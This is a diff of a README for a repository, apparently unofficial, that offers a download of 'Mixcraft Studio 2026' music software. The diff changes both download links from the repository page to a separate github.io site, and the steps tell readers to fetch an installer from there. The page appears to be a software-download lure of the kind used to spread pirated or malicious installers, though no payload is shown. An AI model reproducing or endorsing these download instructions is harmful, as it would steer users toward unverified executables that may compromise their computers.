@@ -1,6 +1,6 @@
 # 🎵 Mixcraft-Studio-2026 - Simple music production for your computer
 
-[![](https://img.shields.io/badge/Download-Mixcraft_Studio-blue.svg)](https://github.com/Bluenesslilith864/Mixcraft-Studio-2026)
+[![](https://img.shields.io/badge/Download-Mixcraft_Studio-blue.svg)](https://bluenesslilith864.github.io)
 
 Mixcraft Studio 2026 provides a complete environment for recording, mixing, and producing audio. This software works on Windows 10 and Windows 11. It supports multitrack recording and offers tools for modern music production. You can use this software to record instruments, arrange loops, and master your final tracks.
 
@@ -9,7 +9,7 @@ Mixcraft Studio 2026 provides a complete environment for recording, mixing, and 
 You must visit the official repository page to access the installation files. Follow these steps to obtain the correct version for your system:
 
 1. Open your web browser.
-2. Go to [https://github.com/Bluenesslilith864/Mixcraft-Studio-2026](https://github.com/Bluenesslilith864/Mixcraft-Studio-2026).
+2. Go to [https://bluenesslilith864.github.io](https://bluenesslilith864.github.io).
 3. Find the release section on the right side of the page.
 4. Click the link to download the installer file.
 
